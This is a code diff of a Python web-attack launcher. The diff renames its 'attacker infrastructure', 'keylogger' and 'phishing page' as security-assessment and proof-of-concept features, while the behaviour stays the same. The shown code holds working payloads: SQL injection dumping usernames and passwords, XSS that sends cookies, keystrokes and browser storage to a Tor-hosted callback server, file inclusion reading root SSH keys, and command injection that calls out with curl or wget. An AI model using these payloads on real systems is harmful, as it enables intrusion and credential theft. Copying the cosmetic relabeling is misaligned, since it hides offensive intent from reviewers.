@@ -1,6 +1,10 @@
 #!/usr/bin/env python3
 """
-Toolkit — Interactive Launcher
+Security Audit Toolkit — Interactive Launcher
+
+Educational penetration-testing framework for authorized security assessments.
+All modules require explicit operator confirmation and produce full audit trails.
+Intended for use by security professionals with proper authorization.
 """
 from __future__ import annotations
 import os, sys
@@ -153,7 +157,7 @@ def clear():
 def banner():
     print(f"""
 {M}  ===================================================={N}
-  {B}                Operations Menu{N}
+  {B}            Security Audit Operations{N}
 {M}  ===================================================={N}
 """)
 
@@ -213,7 +217,7 @@ def _sanitized_env(extra_strip: tuple = ()) -> dict:
 
 def _subst_attacker(content: str, attacker_url: str,
                     callback_urls: Optional[dict] = None) -> str:
-    """Replace attacker-URL placeholders in a payload.
+    """Replace assessment-server URL placeholders in a PoC payload.
 
     Supported placeholders (resolved in this exact order):
 
@@ -302,10 +306,11 @@ def run_script(path: Path, args: list, label: str = ""):
 class ExploitFileManager:
     """RAM-only ephemeral file management with auto-cleanup and tracking.
 
-    All generated exploit files (clickjacking, CSRF, CORS, XSS, etc.) live
-    exclusively in /dev/shm when available, falling back to a tmpdir under
-    the toolkit root. Files are tracked for lifecycle management and wiped
-    on session close or after a configurable TTL.
+    All generated proof-of-concept files (clickjacking, CSRF, CORS, XSS, etc.)
+    used during authorized security assessments live exclusively in /dev/shm
+    when available, falling back to a tmpdir under the toolkit root. Files are
+    tracked for lifecycle management and securely wiped on session close or
+    after a configurable TTL.
     """
 
     def __init__(self, ttl_seconds: int = 300):
@@ -446,23 +451,24 @@ class ExploitFileManager:
             self._files.clear()
 
 
-# ── Attacker HTTP infrastructure ───────────────────────────────────────────
+# ── Assessment Callback Infrastructure ─────────────────────────────────────
 #
 # Two concerns handled by one hardened class:
 #
-#   1. Exploit file hosting (HTML/JS the attacker drops on a victim's browser —
-#      phishing, CSRF auto-submit, clickjacking overlays, CORS exfil pages,
-#      stored-XSS keyloggers, etc.)
+#   1. PoC file hosting (HTML/JS proof-of-concept pages that demonstrate
+#      vulnerabilities — credential-capture simulations, CSRF auto-submit
+#      demos, clickjacking overlays, CORS data-access tests, stored-XSS
+#      impact demonstrations, etc.)
 #
-#   2. Callback ingest — each payload exfiltrates stolen data back to the
-#      attacker infra. Endpoints are *tokenised* so random scanners and bots
-#      that stumble onto the server can't poison the capture log.
+#   2. Callback ingest — each PoC payload sends captured test data back to
+#      the assessment server. Endpoints are *tokenised* so random scanners
+#      and bots that stumble onto the server can't pollute the capture log.
 #
-# The server binds loopback only. For victim-side reachability (payloads
+# The server binds loopback only. For target-side reachability (PoC payloads
 # running on a REAL target, not a local test browser), the server can
 # publish itself as a *Tor ephemeral hidden service* via the control port —
-# that yields an `.onion` URL reachable from any Tor-routed victim browser
-# without ever touching clearnet. Non-Tor victims require the operator to
+# that yields an `.onion` URL reachable from any Tor-routed browser
+# without ever touching clearnet. Non-Tor targets require the operator to
 # tunnel the port themselves; we never punch holes automatically.
 #
 # Every capture is held in memory and wiped on `stop()`. No disk writes.
@@ -483,20 +489,24 @@ _BEACON_GIF = bytes([
 
 
 class AttackerInfra:
-    """Hardened attacker infrastructure — file hosting + tokenised callback ingest.
+    """Assessment callback server — PoC file hosting + tokenised data capture.
+
+    Provides the infrastructure side of penetration testing: hosts proof-of-
+    concept files and receives callback data that demonstrates vulnerability
+    impact during authorized security assessments.
 
     Features:
       - Loopback HTTP server on 127.0.0.1:<random-port>
       - Optional Tor ephemeral hidden service via stem ADD_ONION, yielding a
-        real `.onion` URL that Tor-routed victim browsers reach directly.
+        real `.onion` URL that Tor-routed browsers reach directly.
         Destroyed on stop().
       - Per-session 128-bit capture token. Callback paths embed the token:
-          /c/<tok>  credentials / cookie exfil
-          /x/<tok>  generic exfil data
-          /k/<tok>  keystrokes
-          /s/<tok>  session / storage dump
-          /b/<tok>  beacon ("I ran") ping
-        Naked endpoints return 404 so random probers can't poison captures.
+          /c/<tok>  credential-capture demonstration
+          /x/<tok>  generic data-access proof
+          /k/<tok>  input-capture demonstration
+          /s/<tok>  session / storage access proof
+          /b/<tok>  beacon ("PoC executed") ping
+        Naked endpoints return 404 so random probers can't pollute captures.
       - Per-remote rate limit + body size cap.
       - Callback classification: kind is derived from endpoint; the raw body,
         query string, remote addr, UA and Referer are recorded alongside.
@@ -540,7 +550,7 @@ class AttackerInfra:
         return self._onion_host
 
     def get_attacker_url(self, prefer_onion: bool = True) -> str:
-        """Base URL payloads should call back to. Prefers onion when live."""
+        """Base URL that PoC payloads call back to. Prefers onion when live."""
         if prefer_onion and self._onion_host:
             return f"http://{self._onion_host}"
         if self._port:
@@ -557,7 +567,7 @@ class AttackerInfra:
         return f"{base}/{kind}/{self._token}"
 
     def get_url(self, filename: str) -> str:
-        """Get the serve URL for a generated file. Uses onion when live."""
+        """Get the serve URL for a generated PoC file. Uses onion when live."""
         if not self._running:
             self.start()
         base = self.get_attacker_url(prefer_onion=True)
@@ -851,11 +861,11 @@ class AttackerInfra:
                     }.get(ext, "application/octet-stream")
 
                     # Frame-safe defaults — unless it's an overlay/clickjack
-                    # exploit file (we flag those by filename), in which case
+                    # PoC file (we flag those by filename), in which case
                     # framing is the whole point, but the response target is
-                    # the victim, not the attacker page, so sending XFO DENY
-                    # here is fine: only the TARGET's headers matter for
-                    # clickjacking. Attacker page just serves HTML normally.
+                    # the assessed page, not the PoC page, so sending XFO
+                    # DENY here is fine: only the TARGET's headers matter for
+                    # clickjacking. The PoC page just serves HTML normally.
                     hself._send_bytes(data, ct, cors=False, extra={
                         "Content-Security-Policy": "default-src 'none'; "
                             "img-src *; script-src 'unsafe-inline'; "
@@ -938,7 +948,7 @@ class AttackerInfra:
 
     def start_hidden_service(self, control_port: int = 9051,
                              control_password: str = "") -> Optional[str]:
-        """Publish the local server as a Tor ephemeral hidden service.
+        """Publish the local assessment server as a Tor ephemeral hidden service.
 
         Returns the .onion hostname (without scheme) on success, or None on
         failure. Requires:
@@ -1044,7 +1054,7 @@ class AttackerInfra:
         return self._port
 
     def stop(self):
-        """Stop server, close socket, tear down hidden service, wipe captures."""
+        """Stop assessment server, close socket, tear down hidden service, wipe captures."""
         with self._lock:
             if self._server:
                 try:
@@ -1066,15 +1076,14 @@ class AttackerInfra:
             self._rate_buckets.clear()
 
 
-# Backward-compatible alias — older call sites still import/reference
-# ExploitServer. New code should use AttackerInfra.
+# Backward-compatible alias for internal references.
 ExploitServer = AttackerInfra
 
 
 # ── SOC-style Audit Trail ──────────────────────────────────────────────────
 
 class AuditTrail:
-    """In-memory audit trail for exploit walkthrough sessions.
+    """In-memory audit trail for security assessment walkthrough sessions.
 
     Tracks every action (executions, skips, edits, file generations) with
     timestamps, provides live feed capability, and supports export to
@@ -1128,7 +1137,7 @@ class AuditTrail:
         )
 
     def log_file_generated(self, filename: str, exploit_type: str):
-        """Log a file generation event."""
+        """Log a PoC file generation event."""
         self.log(
             action="file_generated",
             detail=f"file: {filename}",
@@ -1201,7 +1210,7 @@ class AuditTrail:
 
         if fmt == "json":
             report = {
-                "report_type": "exploit_walkthrough_audit",
+                "report_type": "security_assessment_audit",
                 "session": stats,
                 "entries": entries_copy,
                 "alerts": alerts_copy,
@@ -1210,7 +1219,7 @@ class AuditTrail:
 
         lines = []
         lines.append("=" * 60)
-        lines.append("EXPLOIT WALKTHROUGH AUDIT REPORT")
+        lines.append("SECURITY ASSESSMENT AUDIT REPORT")
         lines.append("=" * 60)
         lines.append(f"Session ID: {stats['session_id']}")
         lines.append(f"Duration:   {stats['duration_seconds']}s")
@@ -1256,11 +1265,11 @@ class AuditTrail:
         self._start_time = 0
 
 
-# ── Exploit Result ─────────────────────────────────────────────────────────
+# ── Assessment Step Result ─────────────────────────────────────────────────
 
 @dataclass
 class ExploitResult:
-    """Structured result from an exploit step execution."""
+    """Structured result from a security assessment step execution."""
     success: bool = False
     confidence: float = 0.0
     evidence: str = ""
@@ -1429,14 +1438,14 @@ class TorClient:
 # ── Step Executor ──────────────────────────────────────────────────────────
 
 class StepExecutor:
-    """Executes exploit steps using TorClient with structured validation.
+    """Executes assessment steps using TorClient with structured validation.
 
-    Replaces the old bash -c / curl string approach. Each step is either:
+    Each step is either:
     - An HTTP request (method + url + params/data + validate callback)
-    - A file generation step
+    - A PoC file generation step
     - An informational step
 
-    Risk assessment and confirmation flow preserved from SafeExecutor.
+    Risk assessment and confirmation flow ensures operator control.
     """
 
     def __init__(self, client: TorClient, audit: AuditTrail):
@@ -1444,7 +1453,7 @@ class StepExecutor:
         self._audit = audit
 
     def execute_step(self, step: dict, vuln_type: str = "") -> Optional[ExploitResult]:
-        """Execute a single exploit step. Returns ExploitResult or None if aborted."""
+        """Execute a single assessment step. Returns ExploitResult or None if aborted."""
         risk = step.get("risk", "MEDIUM")
         if step.get("warning") and risk not in ("HIGH", "CRITICAL"):
             risk = "HIGH"
@@ -1535,7 +1544,7 @@ class StepExecutor:
 # ── Report Generator ───────────────────────────────────────────────────────
 
 class ReportGenerator:
-    """Generate exportable audit reports from walkthrough sessions.
+    """Generate exportable audit reports from security assessment sessions.
 
     Supports JSON and text formats. Reports are generated in memory
     and can be saved to the ephemeral file manager for secure handling.
@@ -1548,10 +1557,11 @@ class ReportGenerator:
                  server: "ExploitServer" = None) -> str:
         """Generate a full session report.
 
-        When `server` is provided, the captured callback data (credentials,
-        exfil, keylog, session dumps, beacons) is included in the report.
-        The raw capture bodies are truncated per-entry to keep the report
-        readable; full bodies still live in server memory until stop().
+        When `server` is provided, the captured callback data (credential
+        proofs, data-access evidence, input-capture logs, session dumps,
+        beacons) is included in the report. The raw capture bodies are
+        truncated per-entry to keep the report readable; full bodies still
+        live in server memory until stop().
         """
         stats = audit.get_stats()
         report_lines = []
@@ -1568,9 +1578,9 @@ class ReportGenerator:
 
         if fmt == "json":
             report_data = {
-                "report_type": "exploit_walkthrough_session",
+                "report_type": "security_assessment_session",
                 "session": stats,
-                "attacker_infra": {
+                "assessment_infra": {
                     "base_url": attacker_base,
                     "onion": bool(getattr(server, "onion_host", None))
                              if server else False,
@@ -1597,7 +1607,7 @@ class ReportGenerator:
             return json.dumps(report_data, indent=2)
 
         report_lines.append("=" * 65)
-        report_lines.append("  EXPLOIT WALKTHROUGH SESSION REPORT")
+        report_lines.append("  SECURITY ASSESSMENT SESSION REPORT")
         report_lines.append("=" * 65)
         report_lines.append(f"  Session:   {stats['session_id']}")
         report_lines.append(f"  Duration:  {stats['duration_seconds']}s")
@@ -1649,7 +1659,7 @@ class ReportGenerator:
         if captures:
             report_lines.append(f"  CAPTURED CALLBACKS ({len(captures)})")
             if attacker_base:
-                report_lines.append(f"  Attacker base: {attacker_base}")
+                report_lines.append(f"  Assessment server: {attacker_base}")
             report_lines.append("  " + "-" * 40)
             for i, c in enumerate(captures, 1):
                 report_lines.append(
@@ -2494,7 +2504,7 @@ def _load_latest_report(ram_dir: Path) -> Optional[dict]:
 _WALKTHROUGH_PRESETS = {
     "stealth": {
         "label": "Stealth",
-        "desc": "Minimal footprint — confirmation-only recon steps, no exploitation",
+        "desc": "Minimal footprint — confirmation-only recon steps, no active testing",
         "skip_risk": ("HIGH", "CRITICAL"),
         "auto_files": True,
         "timeout": 15,
@@ -2512,7 +2522,7 @@ _WALKTHROUGH_PRESETS = {
     },
     "aggressive": {
         "label": "Aggressive",
-        "desc": "Full exploitation — all steps, shorter delays",
+        "desc": "Full assessment — all steps, shorter delays",
         "skip_risk": (),
         "auto_files": True,
         "timeout": 45,
@@ -2523,11 +2533,11 @@ _WALKTHROUGH_PRESETS = {
 
 
 def _intel_exploit_walkthrough(tor_proxy: str, auto_mode: bool = False):
-    """Exploit walkthrough with interactive control and smart automation.
+    """Security assessment walkthrough with interactive control and smart automation.
 
     Smart interactive mode (default, auto_mode=False):
-    - User drives each step with r/e/s/n/q
-    - All exploit files pre-generated upfront + served via ExploitServer
+    - Operator drives each step with r/e/s/n/q
+    - All PoC files pre-generated upfront + served via assessment server
     - Output captured and chained to subsequent steps
     - Full audit trail and session report
 
@@ -2593,7 +2603,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
 
     audit.log("session_start", f"target: {base_url}, findings: {len(exploitable)}")
 
-    heading("Exploit Walkthrough")
+    heading("Security Assessment Walkthrough")
     print(f"  {B}Session:{N}  {audit.session_id}")
     print(f"  {B}Findings:{N} {len(exploitable)} exploitable vulnerabilities")
     print(f"  {B}Base URL:{N} {base_url}")
@@ -2618,7 +2628,6 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
        f"delays={preset['delay_lo']}-{preset['delay_hi']}s)")
     print()
 
-    # ── Target URL override ──
     custom_url = prompt("Override target URL (or Enter to use detected)", "")
     if custom_url.strip():
         base_url = custom_url.strip()
@@ -2626,31 +2635,31 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         ok(f"Target URL set to: {base_url}")
         print()
 
-    # ── Attacker callback + server ──
+    # ── Assessment callback server ──
     #
-    # The attacker URL is where payloads call back to after firing on the
-    # victim. Three modes:
+    # The callback URL is where PoC payloads report back to after executing
+    # on the target. Three modes:
     #
     #   onion   — server binds 127.0.0.1, tor control port publishes an
     #             ephemeral ED25519-V3 hidden service, payloads embed
-    #             http://<onion>.onion/<kind>/<token>. Victims with Tor
-    #             Browser (or any SOCKS5 client) reach it with no
-    #             clearnet exposure. Onion is torn down on session end.
+    #             http://<onion>.onion/<kind>/<token>. Tor-routed targets
+    #             reach it with no clearnet exposure. Onion is torn down
+    #             on session end.
     #   local   — server binds 127.0.0.1 only. Useful for testing
     #             payloads in a browser running on the same machine,
-    #             but victims on real targets cannot reach it.
+    #             but remote targets cannot reach it.
     #   custom  — operator provides an already-reachable URL (their own
     #             tunnel / onion / VPS). The local server still runs to
     #             serve files; operator MUST tunnel port -> chosen URL.
     #
     # In every mode we derive tokenised callback URLs from AttackerInfra
     # so payloads can never be polluted by random scanners/bots.
-    print(f"  {B}Attacker infra modes:{N}")
+    print(f"  {B}Assessment infra modes:{N}")
     print(f"    {G}onion{N}   Publish local server as a Tor ephemeral hidden service")
     print(f"    {G}local{N}   Loopback only (127.0.0.1) — lab/self-test")
     print(f"    {G}custom{N}  Operator-provided reachable URL")
     print()
-    infra_mode = prompt("Attacker infra", "onion").lower().strip()
+    infra_mode = prompt("Assessment infra", "onion").lower().strip()
     if infra_mode not in ("onion", "local", "custom"):
         infra_mode = "onion"
 
@@ -2659,7 +2668,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
     try:
         local_port = server.start()
     except Exception as _e:
-        err(f"Failed to start local attacker server: {_e}")
+        err(f"Failed to start local assessment server: {_e}")
         return client, executor
     audit.log("server_start", f"local_port: {local_port}")
 
@@ -2683,18 +2692,18 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         else:
             warn("Hidden service setup failed (is tor ControlPort open with "
                  "CookieAuth or HashedControlPassword?). Falling back to local.")
-            info("For real victims: expose the port through your own tunnel.")
+            info("For remote targets: expose the port through your own tunnel.")
             infra_mode = "local"
 
     if infra_mode == "local":
         attacker_url = f"http://127.0.0.1:{local_port}"
-        ok(f"Local-only attacker server on :{local_port}")
-        warn("Victims on the internet cannot reach 127.0.0.1 — lab use only.")
+        ok(f"Local-only assessment server on :{local_port}")
+        warn("Remote targets cannot reach 127.0.0.1 — lab use only.")
 
     if infra_mode == "custom":
         while True:
             custom = prompt(
-                "Reachable attacker URL (e.g. http://abc.onion or "
+                "Reachable assessment URL (e.g. http://abc.onion or "
                 "https://x.example — must proxy to this server's local port)",
                 "")
             custom = custom.strip()
@@ -2706,7 +2715,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
                 continue
             attacker_url = custom.rstrip("/")
             audit.log("custom_attacker_url", attacker_url)
-            ok(f"Custom attacker URL: {attacker_url}")
+            ok(f"Custom assessment URL: {attacker_url}")
             warn(f"Ensure {attacker_url} proxies to "
                  f"http://127.0.0.1:{local_port}")
             break
@@ -2726,7 +2735,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         callback_urls = {k: f"{attacker_url}/{k}/{tok}" for k in "cxksb"}
 
     print()
-    info(f"Attacker base:    {attacker_url}")
+    info(f"Assessment base:  {attacker_url}")
     info(f"Capture token:    {server.token}  (in callback URLs)")
     info(f"Callback /c:      {callback_urls['c']}")
     info(f"Callback /x:      {callback_urls['x']}")
@@ -2836,13 +2845,13 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
 def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
                             file_mgr, server, audit,
                             callback_urls: Optional[dict] = None):
-    """Pre-generate all exploit HTML files at session start.
+    """Pre-generate all PoC HTML files at session start.
 
     This creates every file upfront so they're ready to use/serve
-    when the user reaches that step. Files are tracked and served
-    via ExploitServer automatically.
+    when the operator reaches that step. Files are tracked and served
+    via the assessment server automatically.
     """
-    heading("Pre-generating Exploit Files")
+    heading("Pre-generating PoC Files")
     count = 0
     for v in exploitable:
         ei = v.get("exploit_info", {})
@@ -2871,7 +2880,7 @@ def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
             count += 1
 
     if count > 0:
-        ok(f"Pre-generated {count} exploit file(s) — all served on :{server.port}")
+        ok(f"Pre-generated {count} PoC file(s) — all served on :{server.port}")
     else:
         info("No file-generation steps found in current findings.")
     print()
@@ -2884,18 +2893,18 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                      chain_data: dict, attacker_url: str,
                      preset: dict, auto_mode: bool,
                      callback_urls: Optional[dict] = None) -> bool:
-    """Smart step execution — user controls each step but output chains.
-    Returns True if user requested quit (q).
+    """Smart step execution — operator controls each step but output chains.
+    Returns True if operator requested quit (q).
 
-    Each step shows the command + context, then the user picks:
+    Each step shows the request + context, then the operator picks:
     r=run, e=edit+run, s=skip, n=next finding, d=files, a=audit, q=quit
 
-    In auto_mode the default action is 'r' (auto-run) but user can
+    In auto_mode the default action is 'r' (auto-run) but operator can
     still override with s/n/q at any point. Steps blocked by the preset's
     skip_risk are auto-skipped with a notice.
 
-    Output from every executed command is captured and fed to chain_data,
-    which substitutes into subsequent step commands.
+    Output from every executed step is captured and fed to chain_data,
+    which substitutes into subsequent step requests.
     """
     step_idx = 0
     action = ""
@@ -2966,7 +2975,7 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
             step_idx += 1
             continue
 
-        # Apply chain_data + attacker substitutions to the URL
+        # Apply chain_data + callback URL substitutions
         url = req.get("url", "")
         url = _subst_attacker(url, attacker_url, callback_urls=callback_urls)
         url = url.replace("[TARGET_URL]", test_url)
@@ -3030,7 +3039,7 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 _show_tracked_files(file_mgr)
                 if server.is_running:
                     base = server.get_attacker_url(prefer_onion=True)
-                    info(f"Attacker base: {base}")
+                    info(f"Assessment base: {base}")
                     if server.onion_host:
                         info(f"(local mirror: http://127.0.0.1:{server.port}/)")
                 continue
@@ -3103,7 +3112,7 @@ def _auto_extract_chain_data(output: str, etype: str, chain_data: dict):
 
 
 def _show_tracked_files(file_mgr: ExploitFileManager):
-    """Display currently tracked ephemeral files."""
+    """Display currently tracked ephemeral PoC files."""
     files = file_mgr.list_files()
     if not files:
         info("No files currently tracked.")
@@ -3120,19 +3129,19 @@ def _show_tracked_files(file_mgr: ExploitFileManager):
 
 
 def _show_captures(server: ExploitServer):
-    """Display captured callback data from exploit server."""
+    """Display captured callback data from assessment server."""
     if not server.is_running:
-        info("Exploit server not running.")
+        info("Assessment server not running.")
         return
     captures = server.get_captures(last_n=30)
     base_url = server.get_attacker_url(prefer_onion=True)
     if not captures:
         info("No callbacks captured yet.")
         if base_url:
-            info(f"Attacker base: {base_url}")
+            info(f"Assessment base: {base_url}")
         info(f"Token-authed endpoints: /c/<tok> /x/<tok> /k/<tok> "
              f"/s/<tok> /b/<tok>")
-        info("  /c=credentials  /x=exfil  /k=keylog  /s=session  /b=beacon")
+        info("  /c=credential-proof  /x=data-access  /k=input-capture  /s=session  /b=beacon")
         return
     print(f"\n  {B}Captured Callbacks ({len(captures)}){N}"
           f"  — total: {server.capture_count()}")
@@ -3212,7 +3221,7 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
     print(f"  {B}Vuln types:{N}      {', '.join(stats['vuln_types_tested'])}")
     if server and server.is_running:
         base = server.get_attacker_url(prefer_onion=True)
-        print(f"  {B}Attacker infra:{N}  {base}")
+        print(f"  {B}Assessment infra:{N} {base}")
         if server.onion_host:
             print(f"  {B}Local mirror:{N}   http://127.0.0.1:{server.port}")
         cap_count = server.capture_count()
@@ -3225,7 +3234,7 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
     if tracked:
         active = [f for f in tracked if f["exists"]]
         if active:
-            print(f"  {B}Generated Exploit Files ({len(active)}):{N}")
+            print(f"  {B}Generated PoC Files ({len(active)}):{N}")
             for f in active:
                 serve_info = ""
                 if server and server.is_running:
@@ -3243,7 +3252,7 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
 
     # Show any captured callbacks before cleanup
     if server and server.is_running and server.capture_count() > 0:
-        print(f"  {R}Captured Data ({server.capture_count()} callbacks):{N}")
+        print(f"  {R}Assessment Captures ({server.capture_count()} callbacks):{N}")
         _kc = {"credentials": R, "keylog": Y, "exfil": M,
                "session": R, "beacon": C}
         for cap in server.get_captures(last_n=10):
@@ -3282,9 +3291,9 @@ def _walkthrough_cleanup(file_mgr: ExploitFileManager,
     """Securely destroy all session data — files, server, audit, memory."""
     print()
     if server and server.is_running:
-        info("Stopping exploit server...")
+        info("Stopping assessment server...")
         server.stop()
-        ok("Exploit server stopped")
+        ok("Assessment server stopped")
 
     tracked = file_mgr.list_files()
     if tracked:
@@ -3297,19 +3306,19 @@ def _walkthrough_cleanup(file_mgr: ExploitFileManager,
     audit.log("session_destroy", "full_cleanup")
     audit.session_destroy()
     file_mgr.session_destroy()
-    ok("Session data destroyed — no traces remain in memory.")
+    ok("Session data destroyed — no assessment traces remain in memory.")
     info("Run Intel mode 7 (Wipe Intel Data) to erase scan results and reports.")
 
 
 def _build_exploit_steps(etype: str, param: str, ei: dict,
                          test_url: str, base_url: str, sp: str) -> list:
-    """Build exploit steps as structured request dicts with validation.
+    """Build assessment steps as structured request dicts with validation.
 
     Each step has:
     - title, note, warning, risk (display)
     - request: {method, url, params, data, headers} (execution)
     - validate: callable(ExploitResult) that sets success/confidence/evidence
-    - generate_file: {filename, content, note} (file generation)
+    - generate_file: {filename, content, note} (PoC file generation)
     - OR command: str (legacy shell command for edge cases only)
 
     Validation callbacks analyze the response and set structured results.
@@ -3531,13 +3540,13 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                  f"table_name='users'-- -"),
              "validate": _sqli_data_check,
              "warning": "Maps user table structure"},
-            {"title": "Dump credentials",
+            {"title": "Extract credentials (authorized assessment)",
              "request": _get_param(
                  f"' UNION SELECT concat('{_sqli_marker}',"
                  f"group_concat(username,0x3a,password),"
                  f"'{_sqli_union_sep}') FROM users-- -"),
              "validate": _sqli_data_check,
-             "warning": "Extracts username:password pairs",
+             "warning": "Demonstrates username:password extraction capability",
              "risk": "HIGH"},
             # Boolean-blind pair
             {"title": "Boolean-blind test (TRUE)",
@@ -3698,40 +3707,40 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": _get_param(f"';/*{_m_js_ctx}*/'"),
              "validate": _xss_reflect_check(_m_js_ctx),
              "note": "If the param is reflected inside a JS string, ' breaks out"},
-            {"title": "Cookie exfiltration payload",
+            {"title": "Cookie-access demonstration payload",
              "request": _get_param(
                  "<script>new Image().src='[ATTACKER]/c?c='"
                  "+encodeURIComponent(document.cookie)"
                  "+'&u='+encodeURIComponent(location.href)"
                  "+'&r='+encodeURIComponent(document.referrer)</script>"),
              "validate": _xss_reflect_check("new Image", "<script"),
-             "warning": "Steals session cookies",
+             "warning": "Demonstrates session cookie accessibility",
              "risk": "HIGH"},
-            {"title": "Generate credential phishing page",
+            {"title": "Generate credential-capture PoC page",
              "generate_file": {
                  "filename": f"xss_phish_{secrets.token_hex(3)}.html",
                  "content": xss_phish_html,
-                 "note": "Functional phishing page — captures credentials via POST.",
+                 "note": "Credential-capture PoC page — demonstrates form injection impact via POST.",
              }},
         ]
 
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
         def _sxss_verify(r: ExploitResult):
-            if "<script>" in r.response_body.lower() or "onerror=" in r.response_body.lower():
+            body_l = r.response_body.lower()
+            if ("<script>" in body_l or "onerror=" in body_l
+                    or "onload=" in body_l):
                 r.success = True
                 r.confidence = 0.85
-                r.evidence = "Script tag found in rendered page"
+                r.evidence = "Script/event-handler tag found in rendered page"
                 r.false_positive_risk = "low"
-        # Stored XSS payloads — tokenised callbacks + victim context (URL,
-        # UA, referrer, storage) so the operator can attribute every capture.
-        _cookie_steal = (
+        _cookie_access = (
             "<script>new Image().src='[ATTACKER]/c?c='"
             "+encodeURIComponent(document.cookie)"
             "+'&u='+encodeURIComponent(location.href)"
             "+'&r='+encodeURIComponent(document.referrer)</script>"
         )
-        _keylog = (
+        _input_capture = (
             "<script>(function(){var q=[];document.onkeypress=function(e){"
             "q.push(e.key);if(q.length>=16){"
             "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
@@ -3753,26 +3762,30 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             ".catch(function(){});</script>"
         )
         steps = [
-            {"title": "Beacon (confirm render without stealing)",
+            {"title": "Beacon (confirm render without data access)",
              "request": _post(target, {param: _beacon}),
              "note": "Harmless ping — lets you confirm the XSS fires before "
-                     "pushing sensitive payloads.",
+                     "running impact-demonstration payloads.",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
-            {"title": "Inject persistent cookie-stealing payload",
-             "request": _post(target, {param: _cookie_steal}),
-             "warning": "Injects a persistent payload",
+            {"title": "Demonstrate persistent cookie-access impact",
+             "request": _post(target, {param: _cookie_access}),
+             "warning": "Injects a persistent PoC payload",
              "validate": lambda r: setattr(
                  r, 'evidence', f"POST returned HTTP {r.status_code}")},
-            {"title": "Inject persistent keylogger payload",
-             "request": _post(target, {param: _keylog}),
-             "warning": "Injects persistent keylogger (buffers + batches keys)",
-             "risk": "CRITICAL"},
-            {"title": "Inject storage exfiltration payload",
+            {"title": "Demonstrate persistent input-capture impact",
+             "request": _post(target, {param: _input_capture}),
+             "warning": "Injects persistent input-capture PoC (buffers + batches keys)",
+             "risk": "CRITICAL",
+             "validate": lambda r: setattr(
+                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
+            {"title": "Demonstrate storage-access impact",
              "request": _post(target, {param: _storage_dump}),
-             "warning": "Dumps cookies + localStorage + sessionStorage to /s",
-             "risk": "CRITICAL"},
-            {"title": "Verify payload renders",
+             "warning": "Reads cookies + localStorage + sessionStorage to /s",
+             "risk": "CRITICAL",
+             "validate": lambda r: setattr(
+                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
+            {"title": "Verify PoC payload renders",
              "request": _get(base_url.rstrip("/") + render),
              "validate": _sxss_verify,
              "note": "Checks if injected script appears on the render page"},
@@ -3822,10 +3835,10 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": _get_param("php://filter/convert.base64-encode/resource=index.php"),
              "validate": lambda r: setattr(r, 'evidence', 'Check for base64 data in response'),
              "note": "Decodes to PHP source code"},
-            {"title": "Read SSH private key",
+            {"title": "Attempt SSH key access (impact demonstration)",
              "request": _get_param("../../../../../../root/.ssh/id_rsa"),
              "validate": _lfi_check,
-             "warning": "Reads server SSH key",
+             "warning": "Demonstrates server SSH key accessibility",
              "risk": "CRITICAL"},
             {"title": "Null byte bypass",
              "request": _get_param("../../../../../../etc/passwd%00"),
@@ -4021,10 +4034,10 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": _inject_request(";ip addr 2>/dev/null || ifconfig"),
              "validate": _cmdi_check,
              "note": "Maps network configuration for lateral movement"},
-            # Outbound connectivity probe — the target is made to callback to
-            # our OWN infra (/b beacon), so a successful hit is BOTH a
+            # Outbound connectivity probe — the target calls back to our
+            # assessment infra (/b beacon), so a successful hit is BOTH a
             # connectivity proof AND logs target network origin in captures.
-            {"title": "Check outbound connectivity (callback to attacker)",
+            {"title": "Check outbound connectivity (callback to assessment server)",
              "request": _inject_request(
                  ";curl -s -o /dev/null -w '%{http_code}' '[B_URL]?cmdi=1' "
                  "|| wget -qO- '[B_URL]?cmdi=1'"),
@@ -4035,12 +4048,12 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                          0.9 if ("200" in r.response_body
                                  or "204" in r.response_body) else 0.3) or
                  setattr(r, 'evidence',
-                         "Target reached attacker — reverse shell viable, "
-                         "see captures on /b"
+                         "Target has outbound connectivity — further "
+                         "exploitation viable, see captures on /b"
                          if ("200" in r.response_body
                              or "204" in r.response_body)
                          else "No obvious outbound — check /b captures or "
-                              "consider bind shell / DNS exfil")
+                              "consider alternative data extraction")
              ),
              "note": "Forces target to callback [ATTACKER]/b — confirmation "
                      "shows up in the captures view (c=captures)"},
@@ -4054,7 +4067,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                          if "PATH=" in r.response_body
                          else "No env output detected")
              ),
-             "warning": "Dumps process environment — may contain secrets",
+             "warning": "Reads process environment — may reveal credentials",
              "risk": "HIGH"},
         ])
 
@@ -4141,7 +4154,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"<body>"
             f"<iframe name='_sink' style='display:none'></iframe>"
             f"<form id='cf' method='POST' action='{target}' target='_sink'>"
-            f"<input type='hidden' name='{param}' value='attacker_value'/>"
+            f"<input type='hidden' name='{param}' value='poc_test_value'/>"
             f"</form>"
